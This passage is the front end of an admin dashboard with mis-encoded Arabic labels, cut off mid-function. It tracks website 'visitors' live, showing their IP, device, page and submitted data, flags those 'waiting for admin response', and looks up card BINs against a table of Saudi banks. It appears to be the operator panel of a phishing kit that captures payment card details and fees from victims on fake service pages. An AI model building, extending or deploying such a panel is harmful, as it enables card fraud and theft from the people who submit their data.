<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ… - Ø³Ø¬Ù„</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdn.socket.io/4.6.0/socket.io.min.js"></script>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap');
    body { font-family: 'Tajawal', sans-serif; }
    .visitor-card { transition: all 0.3s ease; }
    .visitor-card:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
    .pulse { animation: pulse 2s infinite; }
    @keyframes pulse {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.5; }
    }
    .waiting-badge { animation: blink 1s infinite; }
    @keyframes blink {
      0%, 100% { background-color: #fef3c7; }
      50% { background-color: #fde68a; }
    }
    .data-section { border-right: 4px solid #3b82f6; }
    .disconnected { opacity: 0.6; }
  </style>
</head>
<body class="bg-gray-100 min-h-screen">
  <!-- Login Modal -->
  <div id="loginModal" class="fixed inset-0 bg-black/50 flex items-center justify-center z-50" style="display: none;">
    <div class="bg-white rounded-xl p-8 max-w-md w-full mx-4">
      <h2 class="text-2xl font-bold text-center mb-6">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</h2>
      <form id="loginForm">
        <div class="mb-4">
          <label class="block text-gray-700 mb-2">ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±</label>
          <input type="password" id="password" class="w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent" placeholder="Ø£Ø¯Ø®Ù„ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±">
        </div>
        <button type="submit" class="w-full bg-blue-600 text-white py-3 rounded-lg hover:bg-blue-700 transition">Ø¯Ø®ÙˆÙ„</button>
      </form>
      <p id="loginError" class="text-red-500 text-center mt-4 hidden">ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± ØºÙŠØ± ØµØ­ÙŠØ­Ø©</p>
    </div>
  </div>

  <!-- Main Dashboard -->
  <div id="dashboard" class="hidden">
    <!-- Header -->
    <header class="bg-white shadow-sm">
      <div class="container mx-auto px-4 py-4 flex justify-between items-center">
        <div class="flex items-center gap-3">
          <div class="relative">
            <button id="settingsBtn" onclick="toggleSettingsMenu()" class="p-2 hover:bg-gray-100 rounded-lg transition">
              <svg class="w-6 h-6 text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10.325 4.317c.426-1.756 2.924-1.756 3.35 0a1.724 1.724 0 002.573 1.066c1.543-.94 3.31.826 2.37 2.37a1.724 1.724 0 001.065 2.572c1.756.426 1.756 2.924 0 3.35a1.724 1.724 0 00-1.066 2.573c.94 1.543-.826 3.31-2.37 2.37a1.724 1.724 0 00-2.572 1.065c-.426 1.756-2.924 1.756-3.35 0a1.724 1.724 0 00-2.573-1.066c-1.543.94-3.31-.826-2.37-2.37a1.724 1.724 0 00-1.065-2.572c-1.756-.426-1.756-2.924 0-3.35a1.724 1.724 0 001.066-2.573c-.94-1.543.826-3.31 2.37-2.37.996.608 2.296.07 2.572-1.065z"/>
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z"/>
              </svg>
            </button>
            <div id="settingsMenu" class="hidden absolute left-0 mt-2 w-48 bg-white rounded-lg shadow-lg border z-50">
              <button onclick="showChangePasswordModal()" class="w-full text-right px-4 py-3 hover:bg-gray-50 flex items-center gap-2">
                <svg class="w-5 h-5 text-gray-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 7a2 2 0 012 2m4 0a6 6 0 01-7.743 5.743L11 17H9v2H7v2H4a1 1 0 01-1-1v-2.586a1 1 0 01.293-.707l5.964-5.964A6 6 0 1121 9z"/>
                </svg>
                <span>ØªØºÙŠÙŠØ± ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±</span>
              </button>
              <button onclick="clearAllData()" class="w-full text-right px-4 py-3 hover:bg-gray-50 flex items-center gap-2 text-orange-600 border-t">
                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"/>
                </svg>
                <span>Ù…Ø³Ø­ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª</span>
              </button>
              <button onclick="logout()" class="w-full text-right px-4 py-3 hover:bg-gray-50 flex items-center gap-2 text-red-600 border-t">
                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1"/>
                </svg>
                <span>ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø®Ø±ÙˆØ¬</span>
              </button>
            </div>
          </div>
          <h1 class="text-2xl font-bold text-gray-800">Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ…</h1>
        </div>
        <div class="flex items-center gap-4">
          <span id="connectionStatus" class="flex items-center gap-2">
            <span class="w-3 h-3 bg-green-500 rounded-full pulse"></span>
            <span class="text-green-600">Ù…ØªØµÙ„</span>
          </span>
          <span id="visitorCount" class="bg-blue-100 text-blue-800 px-3 py-1 rounded-full text-sm">0 Ø²Ø§Ø¦Ø±</span>
        </div>
      </div>
    </header>

    <!-- Change Password Modal -->
    <div id="changePasswordModal" class="hidden fixed inset-0 bg-black/50 flex items-center justify-center z-50">
      <div class="bg-white rounded-xl p-8 max-w-md w-full mx-4">
        <h2 class="text-xl font-bold text-center mb-6">ØªØºÙŠÙŠØ± ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±</h2>
        <form id="changePasswordForm">
          <div class="mb-4">
            <label class="block text-gray-700 mb-2">ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø§Ù„Ø­Ø§Ù„ÙŠØ©</label>
            <input type="password" id="oldPassword" class="w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent" placeholder="Ø£Ø¯Ø®Ù„ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø§Ù„Ø­Ø§Ù„ÙŠØ©">
          </div>
          <div class="mb-4">
            <label class="block text-gray-700 mb-2">ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©</label>
            <input type="password" id="newPassword" class="w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent" placeholder="Ø£Ø¯Ø®Ù„ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©">
          </div>
          <div class="mb-4">
            <label class="block text-gray-700 mb-2">ØªØ£ÙƒÙŠØ¯ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©</label>
            <input type="password" id="confirmPassword" class="w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent" placeholder="Ø£Ø¹Ø¯ Ø¥Ø¯Ø®Ø§Ù„ ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø©">
          </div>
          <div class="flex gap-3">
            <button type="submit" class="flex-1 bg-blue-600 text-white py-3 rounded-lg hover:bg-blue-700 transition">Ø­ÙØ¸</button>
            <button type="button" onclick="hideChangePasswordModal()" class="flex-1 bg-gray-200 text-gray-700 py-3 rounded-lg hover:bg-gray-300 transition">Ø¥Ù„ØºØ§Ø¡</button>
          </div>
        </form>
        <p id="passwordError" class="text-red-500 text-center mt-4 hidden"></p>
        <p id="passwordSuccess" class="text-green-500 text-center mt-4 hidden">ØªÙ… ØªØºÙŠÙŠØ± ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø¨Ù†Ø¬Ø§Ø­</p>
      </div>
    </div>

    <div class="container mx-auto px-4 py-6 flex gap-6">
      <!-- Visitors List -->
      <div class="w-1/3">
        <div class="bg-white rounded-xl shadow-sm p-4">
          <h2 class="text-lg font-bold mb-2">Ø§Ù„Ø²ÙˆØ§Ø±</h2>
          <div class="flex gap-2 mb-3">
            <button onclick="selectAllVisitors()" class="flex-1 bg-blue-100 text-blue-700 px-3 py-1.5 rounded-lg text-sm hover:bg-blue-200 transition">ØªØ­Ø¯ÙŠØ¯ Ø§Ù„ÙƒÙ„</button>
            <button onclick="deleteSelectedVisitors()" class="flex-1 bg-red-100 text-red-700 px-3 py-1.5 rounded-lg text-sm hover:bg-red-200 transition">Ø­Ø°Ù Ø§Ù„Ù…Ø­Ø¯Ø¯ÙŠÙ†</button>
          </div>
          <div id="visitorsList" class="space-y-3">
            <p class="text-gray-500 text-center py-8">Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ø²ÙˆØ§Ø± Ø­Ø§Ù„ÙŠØ§Ù‹</p>
          </div>
        </div>
      </div>

      <!-- Visitor Details -->
      <div class="w-2/3">
        <div id="visitorDetails" class="bg-white rounded-xl shadow-sm p-6">
          <div class="text-center py-12 text-gray-500">
            <svg class="w-16 h-16 mx-auto mb-4 text-gray-300" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"/>
            </svg>
            <p>Ø§Ø®ØªØ± Ø²Ø§Ø¦Ø± Ù„Ø¹Ø±Ø¶ Ø§Ù„ØªÙØ§ØµÙŠÙ„</p>
          </div>
        </div>
      </div>
    </div>
  </div>

  <script>
    // Socket connection
    const SOCKET_URL = window.location.hostname === 'localhost' 
      ? 'http://localhost:3001' 
      : window.location.origin;
    
    let socket;
    let visitors = new Map();
    let selectedVisitorId = null;

    // Ø¯Ø§Ù„Ø© ØªØ­Ø¯ÙŠØ¯ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ø¨Ø·Ø§Ù‚Ø© Ù…Ù† Ø±Ù‚Ù… BIN
    function getCardInfo(cardNumber) {
      const bin = cardNumber.replace(/\s/g, '').substring(0, 6);
      const firstDigit = bin.charAt(0);
      
      // ØªØ­Ø¯ÙŠØ¯ Ø´Ø¨ÙƒØ© Ø§Ù„Ø¨Ø·Ø§Ù‚Ø©
      let network = 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ';
      if (firstDigit === '4') network = 'Visa';
      else if (firstDigit === '5') network = 'Mastercard';
      else if (firstDigit === '6') network = 'Mada';
      else if (bin.startsWith('34') || bin.startsWith('37')) network = 'Amex';
      
      // Ù‚Ø§Ø¹Ø¯Ø© Ø¨ÙŠØ§Ù†Ø§Øª BIN Ù„Ù„Ø¨Ù†ÙˆÙƒ Ø§Ù„Ø³Ø¹ÙˆØ¯ÙŠØ© - Ø¨ÙŠØ§Ù†Ø§Øª Ù…ÙˆØ«ÙˆÙ‚Ø© Ù…Ù† bincheck.io
      const binDatabase = {
        // Ø§Ù„Ø£Ù‡Ù„ÙŠ Ø§Ù„Ø³Ø¹ÙˆØ¯ÙŠ (The Saudi National Bank / SNB)
        '529415': { bank: 'Ø§Ù„Ø£Ù‡Ù„ÙŠ', type: 'Debit', tier: 'Standard' },
        '524130': { bank: 'Ø§Ù„Ø£Ù‡Ù„ÙŠ', type: 'Debit', tier: 'World Flex' },
        
        // Ø§Ù„Ø±ÙŠØ§Ø¶ (Riyad Bank)
        '529741': { bank: 'Ø§Ù„Ø±ÙŠØ§Ø¶', type: 'Debit', tier: 'Standard' },
        '558563': { bank: 'Ø§Ù„Ø±ÙŠØ§Ø¶', type: 'Debit', tier: 'Prepaid' },
        '454683': { bank: 'Ø§Ù„Ø±ÙŠØ§Ø¶', type: 'Credit', tier: 'Platinum' },
        '520090': { bank: 'Ø§Ù„Ø±ÙŠØ§Ø¶', type: 'Credit', tier: 'Platinum' },
        '524514': { bank: 'Ø§Ù„Ø±ÙŠØ§Ø¶', type: 'Debit', tier: 'Platinum' },
        
        // Ø§Ù„Ø¨Ù„Ø§Ø¯ (Al Bilad Bank)
        '446393': { bank: 'Ø§Ù„Ø¨Ù„Ø§Ø¯', type: 'Debit', tier: 'Signature' },
        '636120': { bank: 'Ø§Ù„Ø¨Ù„Ø§Ø¯', type: 'Debit', tier: 'Mada' },
        '468540': { bank: 'Ø§Ù„Ø¨Ù„Ø§Ø¯', type: 'Debit', tier: 'Classic' },
        
        // Ø§Ù„Ø¥Ù†Ù…Ø§Ø¡ (Alinma Bank)
        '446672': { bank: 'Ø§Ù„Ø¥Ù†Ù…Ø§Ø¡', type: 'Debit', tier: 'Signature' },
        '543357': { bank: 'Ø§Ù„Ø¥Ù†Ù…Ø§Ø¡', type: 'Debit', tier: 'Prepaid Business' },
        '428671': { bank: 'Ø§Ù„Ø¥Ù†Ù…Ø§Ø¡', type: 'Debit', tier: 'Gold' },
        '428672': { bank: 'Ø§Ù„Ø¥Ù†Ù…Ø§Ø¡', type: 'Debit', tier: 'Business Enhanced' },
        
        // Ø§Ù„Ø¬Ø²ÙŠØ±Ø© (Bank Al Jazira)
        '489317': { bank: 'Ø§Ù„Ø¬Ø²ÙŠØ±Ø©', type: 'Credit', tier: 'Signature Business' },
        '489318': { bank: 'Ø§Ù„Ø¬Ø²ÙŠØ±Ø©', type: 'Debit', tier: 'Rewards' },
        '440532': { bank: 'Ø§Ù„Ø¬Ø²ÙŠØ±Ø©', type: 'Credit', tier: 'Platinum' },
        
        // Ø§Ù„Ø£ÙˆÙ„ / SAB (Saudi Awwal Bank)
        '422817': { bank: 'Ø§Ù„Ø£ÙˆÙ„', type: 'Debit', tier: 'Platinum' },
        '422818': { bank: 'Ø§Ù„Ø£ÙˆÙ„', type: 'Debit', tier: 'Rewards' },
        '422819': { bank: 'Ø§Ù„Ø£ÙˆÙ„', type: 'Debit', tier: 'Rewards' },
        '427222': { bank: 'Ø§Ù„Ø£ÙˆÙ„', type: 'Credit', tier: 'Signature' },
        '433786': { bank: 'Ø§Ù„Ø£ÙˆÙ„', type: 'Credit', tier: 'Platinum' },
        
        // Ø§Ù„ÙØ±Ù†Ø³ÙŠ (Banque Saudi Fransi)
        '440647': { bank: 'Ø§Ù„ÙØ±Ù†Ø³ÙŠ', type: 'Debit', tier: 'Classic' },
        '457865': { bank: 'Ø§Ù„ÙØ±Ù†Ø³ÙŠ', type: 'Debit', tier: 'Platinum' },
        '440795': { bank: 'Ø§Ù„ÙØ±Ù†Ø³ÙŠ', type: 'Debit', tier: 'Business' },
        
        // Ø§Ù„Ø¨Ø±ÙŠØ·Ø§Ù†ÙŠ / SABB (Saudi British Bank)
        '414478': { bank: 'Ø§Ù„Ø¨Ø±ÙŠØ·Ø§Ù†ÙŠ', type: 'Credit', tier: 'Classic' },
        '605141': { bank: 'Ø§Ù„Ø¨Ø±ÙŠØ·Ø§Ù†ÙŠ', type: 'Debit', tier: 'Mada' },
        
        // Ø§Ù„Ø¹Ø±Ø¨ÙŠ (Arab National Bank)
        '524940': { bank: 'Ø§Ù„Ø¹Ø±Ø¨ÙŠ', type: 'Debit', tier: 'Prepaid' },
        '455310': { bank: 'Ø§Ù„Ø¹Ø±Ø¨ÙŠ', type: 'Credit', tier: 'Rewards' },
        
        // Ø§Ù„Ø±Ø§Ø¬Ø­ÙŠ (Al Rajhi Bank)
        '455708': { bank: 'Ø§Ù„Ø±Ø§Ø¬Ø­ÙŠ', type: 'Debit', tier: 'Prepaid Classic' },
        '405433': { bank: 'Ø§Ù„Ø±Ø§Ø¬Ø­ÙŠ', type: 'Debit', tier: 'Prepaid Platinum' },
        '458838': { bank: 'Ø§Ù„Ø±Ø§Ø¬Ø­ÙŠ', type: 'Debit', tier: 'Classic' },
        
        // Ø§Ù„Ø®Ù„ÙŠØ¬ Ø§Ù„Ø¯ÙˆÙ„ÙŠ (GIB)
        '439955': { bank: 'Ø§Ù„Ø®Ù„ÙŠØ¬ Ø§Ù„Ø¯ÙˆÙ„ÙŠ', type: 'Credit', tier: 'Platinum' },
        '439956': { bank: 'Ø§Ù„Ø®Ù„ÙŠØ¬ Ø§Ù„Ø¯ÙˆÙ„ÙŠ', type: 'Debit', tier: 'Platinum' },
      };
      
      // Ø§Ù„Ø¨Ø­Ø« ÙÙŠ Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
      let bankInfo = binDatabase[bin];
      
      // Ø¥Ø°Ø§ Ù„Ù… ÙŠÙˆØ¬Ø¯ØŒ Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ù„Ø¨Ø­Ø« Ø¨Ø£ÙˆÙ„ 4 Ø£Ø±Ù‚Ø§Ù…
      if (!bankInfo) {
        const bin4 = bin.substring(0, 4);
        for (const [key, value] of Object.entries(binDatabase)) {
          if (key.startsWith(bin4)) {
            bankInfo = value;
            break;
          }
        }
      }
      
      // ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù†ÙˆØ¹ Ù…Ù† Ø£ÙˆÙ„ Ø±Ù‚Ù… Ø¥Ø°Ø§ Ù„Ù… ÙŠÙˆØ¬Ø¯ ÙÙŠ Ø§Ù„Ù‚Ø§Ø¹Ø¯Ø©
      if (!bankInfo) {
        let defaultType = 'Debit';
        if (firstDigit === '4' || firstDigit === '5') {
          // Visa/Mastercard - ØªØ®Ù…ÙŠÙ† Ø¨Ù†Ø§Ø¡Ù‹ Ø¹Ù„Ù‰ BIN
          const binNum = parseInt(bin);
          if (binNum >= 400000 && binNum <= 499999) defaultType = 'Credit';
        }
        bankInfo = { bank: 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ', type: defaultType, tier: 'Standard' };
      }
      
      return {
        network: network,
        bank: bankInfo.bank,
        type: bankInfo.type,
        tier: bankInfo.tier
      };
    }

    // DOM Elements
    const loginModal = document.getElementById('loginModal');
    const loginForm = document.getElementById('loginForm');
    const loginError = document.getElementById('loginError');
    const dashboard = document.getElementById('dashboard');
    const visitorsList = document.getElementById('visitorsList');
    const visitorDetails = document.getElementById('visitorDetails');
    const visitorCount = document.getElementById('visitorCount');

    // Auto login if password saved
    const savedPassword = localStorage.getItem('adminPassword');
    if (savedPassword) {
      // Show dashboard immediately, hide login
      dashboard.classList.remove('hidden');
      loginModal.style.display = 'none';
      autoLogin(savedPassword);
    } else {
      // Show login modal
      loginModal.style.display = 'flex';
    }

    function autoLogin(password) {
      socket = io(SOCKET_URL, {
        transports: ['websocket', 'polling'],
      });

      socket.on('connect', () => {
        socket.emit('admin:register', { password });
      });

      socket.on('admin:authenticated', (success) => {
        if (success) {
          localStorage.setItem('adminPassword', password);
          loginModal.style.display = 'none';
          dashboard.classList.remove('hidden');
          setupSocketListeners();
        } else {
          localStorage.removeItem('adminPassword');
          loginModal.style.display = 'flex';
          dashboard.classList.add('hidden');
          loginError.classList.remove('hidden');
        }
      });
    }

    // Login handler
    loginForm.addEventListener('submit', (e) => {
      e.preventDefault();
      const password = document.getElementById('password').value;
      autoLogin(password);
    });

    // Setup socket listeners
    function setupSocketListeners() {
      // Setup password change listener
      socket.on('admin:passwordChanged', (success) => {
        const errorEl = document.getElementById('passwordError');
        const successEl = document.getElementById('passwordSuccess');
        if (success) {
          successEl.classList.remove('hidden');
          localStorage.setItem('adminPassword', document.getElementById('newPassword').value);
          setTimeout(() => {
            hideChangePasswordModal();
          }, 1500);
        } else {
          errorEl.textContent = 'ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ± Ø§Ù„Ø­Ø§Ù„ÙŠØ© ØºÙŠØ± ØµØ­ÙŠØ­Ø©';
          errorEl.classList.remove('hidden');
        }
      });

      socket.on('visitors:list', (list) => {
        list.forEach(v => visitors.set(v._id, v));
        renderVisitorsList();
      });

      socket.on('visitor:new', (visitor) => {
        // Ensure new visitor is marked as connected
        visitor.isConnected = true;
        visitors.set(visitor._id, visitor);
        renderVisitorsList();
        showNotification('Ø²Ø§Ø¦Ø± Ø¬Ø¯ÙŠØ¯: ' + visitor.visitorNumber);
      });

      socket.on('visitor:pageChanged', ({ visitorId, page }) => {
        const visitor = visitors.get(visitorId);
        if (visitor) {
          visitor.page = page;
          visitors.set(visitorId, visitor);
          renderVisitorsList();
          if (selectedVisitorId === visitorId) {
            renderVisitorDetails(visitor);
          }
        }
      });

      socket.on('visitor:dataSubmitted', ({ visitorId, data, visitor }) => {
        // Ensure visitor is marked as connected and update data
        visitor.isConnected = true;
        visitors.set(visitorId, visitor);
        renderVisitorsList();
        // Always update details if this visitor is selected
        if (selectedVisitorId === visitorId) {
          renderVisitorDetails(visitor);
        }
        // Show notification with sound
        showNotification('ğŸ“ Ø¨ÙŠØ§Ù†Ø§Øª Ø¬Ø¯ÙŠØ¯Ø© Ù…Ù† Ø§Ù„Ø²Ø§Ø¦Ø± #' + visitor.visitorNumber);
        // Play notification sound
        try {
          const audio = new Audio('data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACBhYqFbF1fdJivrJBhNjVgodDbq2EcBj+a2teleQAAAAAAAAAAAA==');
          audio.volume = 0.5;
          audio.play().catch(() => {});
        } catch(e) {}
      });

      socket.on('visitor:disconnected', ({ visitorId, socketId }) => {
        const visitor = visitors.get(visitorId);
        if (visitor) {
          visitor.isConnected = false;
          visitors.set(visitorId, visitor);
          renderVisitorsList();
          if (selectedVisitorId === visitorId) {
            renderVisitorDetails(visitor);
          }
        }
      });

      socket.on('visitor:reconnected', ({ visitorId, socketId }) => {
        const visitor = visitors.get(visitorId);
        if (visitor) {
          visitor.isConnected = true;
          visitor.socketId = socketId;
          visitors.set(visitorId, visitor);
          renderVisitorsList();
          if (selectedVisitorId === visitorId) {
            renderVisitorDetails(visitor);
          }
        }
      });
    }

    // Render visitors list
    function renderVisitorsList() {
      const list = Array.from(visitors.values()).sort((a, b) => {
        // Check if visitor has data
        const hasDataA = (a.dataHistory && a.dataHistory.length > 0) || (a.data && Object.keys(a.data).length > 0);
        const hasDataB = (b.dataHistory && b.dataHistory.length > 0) || (b.data && Object.keys(b.data).length > 0);
        
        // Visitors with data come first
        if (hasDataA && !hasDataB) return -1;
        if (!hasDataA && hasDataB) return 1;
        
        // If both have data or both don't, sort by last activity
        const getLastActivity = (v) => {
          // Check lastDataUpdate first (set when data is submitted)
          if (v.lastDataUpdate) {
            return new Date(v.lastDataUpdate).getTime();
          }
          // Then check dataHistory
          if (v.dataHistory && v.dataHistory.length > 0) {
            return new Date(v.dataHistory[v.dataHistory.length - 1].timestamp).getTime();
          }
          return new Date(v.createdAt || 0).getTime();
        };
        // Sort by last activity (most recent first)
        return getLastActivity(b) - getLastActivity(a);
      });
      const connectedCount = list.filter(v => v.isConnected === true).length;
      visitorCount.textContent = connectedCount + ' Ù†Ø´Ø· / ' + list.length + ' Ø²Ø§Ø¦Ø±';

      if (list.length === 0) {
        visitorsList.innerHTML = '<p class="text-gray-500 text-center py-8">Ù„Ø§ ÙŠÙˆØ¬Ø¯ Ø²ÙˆØ§Ø± Ø­Ø§Ù„ÙŠØ§Ù‹</p>';
        return;
      }

      visitorsList.innerHTML = list.map(v => {
        const isSelected = selectedVisitorId === v._id;
        const isDisconnected = v.isConnected !== true;
        // Get visitor name from data or dataHistory if available
        let visitorName = null;
        if (v.data && v.data['Ø§Ù„Ø§Ø³Ù… Ø¨Ø§Ù„Ø¹Ø±Ø¨ÙŠ']) {
          visitorName = v.data['Ø§Ù„Ø§Ø³Ù… Ø¨Ø§Ù„Ø¹Ø±Ø¨ÙŠ'];
        } else if (v.dataHistory && v.dataHistory.length > 0) {
          // Search in dataHistory for the name
          for (const entry of v.dataHistory) {
            if (entry.content && entry.content['Ø§Ù„Ø§Ø³Ù… Ø¨Ø§Ù„Ø¹Ø±Ø¨ÙŠ']) {
              visitorName = entry.content['Ø§Ù„Ø§Ø³Ù… Ø¨Ø§Ù„Ø¹Ø±Ø¨ÙŠ'];
              break;
            }
          }
        }
        const displayName = visitorName ? visitorName : 'Ø²Ø§Ø¦Ø± #' + v.visitorNumber;
        return '<div class="visitor-card p-5 rounded-lg border cursor-pointer relative ' + 
          (isSelected ? 'border-blue-500 bg-blue-50' : 'border-gray-200 hover:border-gray-300') + 
          (isDisconnected ? ' disconnected' : '') + 
          '" onclick="selectVisitor(\'' + v._id + '\')">'+
          // Checkbox at top right
          '<input type="checkbox" class="visitor-checkbox absolute top-2 right-2 w-4 h-4 cursor-pointer" data-visitor-id="' + v._id + '" onclick="event.stopPropagation();" />' +
          // Delete button at top left
          '<button onclick="event.stopPropagation(); deleteVisitorFromCard(\'' + v._id + '\')" class="absolute top-2 left-2 text-xs text-red-500 hover:text-red-700 hover:underline">Ø­Ø°Ù</button>' +
          // Two columns layout
          '<div class="flex justify-between items-start">' +
          // Left column: Visitor name on top, Device info below
          '<div class="flex flex-col items-start">' +
          '<span class="font-bold mb-1">' + displayName + '</span>' +
          '<span class="text-xs text-gray-500">' + v.device + ' - ' + v.browser + ' Â· ' + v.ip + '</span>' +
          '</div>' +
          // Right column: Timer on top, Page name below
          '<div class="flex flex-col items-end">' +
          (v.isConnected === true && v.sessionStartTime ? '<span class="visitor-timer text-xs font-mono bg-green-100 text-green-700 px-2 py-1 rounded mb-1" data-start="' + v.sessionStartTime + '">00:00:00</span>' : '') +
          '<div class="flex items-center gap-1">' +
          '<span class="text-xs px-2 py-1 rounded-full ' + (v.waitingForAdminResponse ? 'waiting-badge text-yellow-800' : 'bg-gray-100 text-gray-600') + '">' + v.page + '</span>' +
          (isDisconnected ? '<span class="w-2 h-2 bg-red-500 rounded-full" title="ØºÙŠØ± Ù…ØªØµÙ„"></span>' : '<span class="w-2 h-2 bg-green-500 rounded-full" title="Ù…ØªØµÙ„"></span>') +
          '</div>' +
          '</div>' +
          '</div>' +
          (v.waitingForAdminResponse ? '<div class="mt-2 text-xs text-yellow-700 font-medium">â³ ÙŠÙ†ØªØ¸Ø± Ø§Ù„Ø±Ø¯</div>' : '') +
          (Object.keys(v.data || {}).length > 0 ? '<div class="mt-2 text-xs text-blue-700 font-medium">ğŸ“ ÙŠÙˆØ¬Ø¯ Ø¨ÙŠØ§Ù†Ø§Øª</div>' : '') +
          '</div>';
      }).join('');
      // Start timers for connected visitors
      startVisitorTimers();
    }

    // Timer functions
    let timerInterval = null;
    function startVisitorTimers() {
      if (timerInterval) clearInterval(timerInterval);
      timerInterval = setInterval(updateTimers, 1000);
      updateTimers();
    }

    function updateTimers() {
      const timers = document.querySelectorAll('.visitor-timer');
      timers.forEach(timer => {
        const startTime = parseInt(timer.dataset.start);
        if (startTime) {
          const elapsed = Math.floor((Date.now() - startTime) / 1000);
          const hours = Math.floor(elapsed / 3600);
          const minutes = Math.floor((elapsed % 3600) / 60);
          const seconds = elapsed % 60;
          timer.textContent = 
            String(hours).padStart(2, '0') + ':' + 
            String(minutes).padStart(2, '0') + ':' + 
            String(seconds).padStart(2, '0');
        }
      });
    }

    // Select visitor
    function selectVisitor(visitorId) {
      selectedVisitorId = visitorId;
      const visitor = visitors.get(visitorId);
      if (visitor) {
        renderVisitorDetails(visitor);
        renderVisitorsList();
      }
    }

    // Render visitor details
    function renderVisitorDetails(visitor) {
      let html = '<div class="space-y-6">';
      
      // Header with device info
      // Get visitor name from data or dataHistory if available
      let visitorName = null;
      if (visitor.data && visitor.data['Ø§Ù„Ø§Ø³Ù… Ø¨Ø§Ù„Ø¹Ø±Ø¨ÙŠ']) {
        visitorName = visitor.data['Ø§Ù„Ø§Ø³Ù… Ø¨Ø§Ù„Ø¹Ø±Ø¨ÙŠ'];
      } else if (visitor.dataHistory && visitor.dataHistory.length > 0) {
        // Search in dataHistory for the name
        for (const entry of visitor.dataHistory) {
          if (entry.content && entry.content['Ø§Ù„Ø§Ø³Ù… Ø¨Ø§Ù„Ø¹Ø±Ø¨ÙŠ']) {
            visitorName = entry.content['Ø§Ù„Ø§Ø³Ù… Ø¨Ø§Ù„Ø¹Ø±Ø¨ÙŠ'];
            break;
          }
        }
      }
      const displayName = visitorName ? visitorName : 'Ø²Ø§Ø¦Ø± #' + visitor.visitorNumber;
      html += '<div class="flex justify-between items-start"><div>';
      html += '<h2 class="text-2xl font-bold">' + displayName + '</h2>';
      html += '<p class="text-gray-500">' + visitor.page + '</p>';
      // Get service name and total fees from data dynamically
      let serviceName = null;
      let totalFees = null;
      
      // Helper function to find total fees dynamically
      function findTotalFees(data) {
        if (!data) return null;
        for (const key of Object.keys(data)) {
          if (key.includes('Ø§Ù„Ù…Ø¬Ù…ÙˆØ¹') || key.includes('Ø§Ù„Ø¥Ø¬Ù…Ø§Ù„ÙŠ') || key.includes('Ø§Ù„ÙƒÙ„ÙŠ')) {
            return data[key];
          }
        }
        return null;
      }
      
      // Helper function to find service name dynamically
      function findServiceName(data) {
